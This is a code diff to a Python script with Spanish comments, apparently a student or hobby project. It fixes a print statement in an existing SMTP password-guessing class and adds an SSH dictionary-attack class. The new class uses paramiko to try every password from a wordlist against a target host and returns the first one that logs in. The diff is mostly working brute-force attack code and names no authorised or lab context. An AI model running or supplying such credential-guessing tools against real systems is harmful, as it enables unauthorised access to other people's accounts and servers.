@@ -14,6 +14,7 @@ Redes:
 
 #Importamos las librerias que usaremos
 import smtplib
+import paramiko
 
 #Creamos nuestra clase junto con el método inicializador
 class Servicio_SMTP():
@@ -66,9 +67,52 @@ class Servicio_SMTP():
                     break
                 #Continuamos el programa ignorando la excepción de autenticación
                 except smtplib.SMTPAuthenticationError:
-                    print("Password Incorrecta: {password}")
+                    print(f"Password Incorrecta: {password}")
 
         #Validamos que el archivo exista con la excepción
+        except FileNotFoundError as error:
+            print(error)
+            exit()
+
+#Cremoas la clase SSH
+class Servicio_SSH():
+    def __init__(self, host, puerto, username, diccionario):
+        #Creamos el diciconario que contendra los datos
+        self.__datos = {
+                "host":host,
+                "puerto":puerto,
+                "username":username,
+                "diccionario":diccionario
+                }
+
+    #Creamos el método que realizará el ataque de diccionario
+    def ataque_SSH(self):
+        try:
+            archivo = open(self.__datos["diccionario"], 'r')
+            #Leemos el contenido del archivo
+            for linea in archivo:
+                password = linea[:-1]
+                #Manejamos las exepciones de SSH
+                try:
+                    #Creamos el cliente SSH
+                    self.__cliente = paramiko.SSHClient()
+                    self.__cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    self.__cliente.connect(self.__datos["host"], self.__datos["puerto"], self.__datos["username"], password)
+                    self.__cliente.close()
+
+                    return password
+
+                    break
+                #Continuamos con la ejecución del programa si la
+                #clave es incorrecta
+                except paramiko.ssh_exception.AuthenticationException:
+                    print(f"Password Incorrecta: {password}")
+                #Si no se puede conectar al host, cerramos el programa
+                except paramiko.ssh_exception.NoValidConnectionsError as error:
+                    print(error)
+                    exit()
+
+        #Imprimimos en pantalla la excepción
         except FileNotFoundError as error:
             print(error)
             exit()
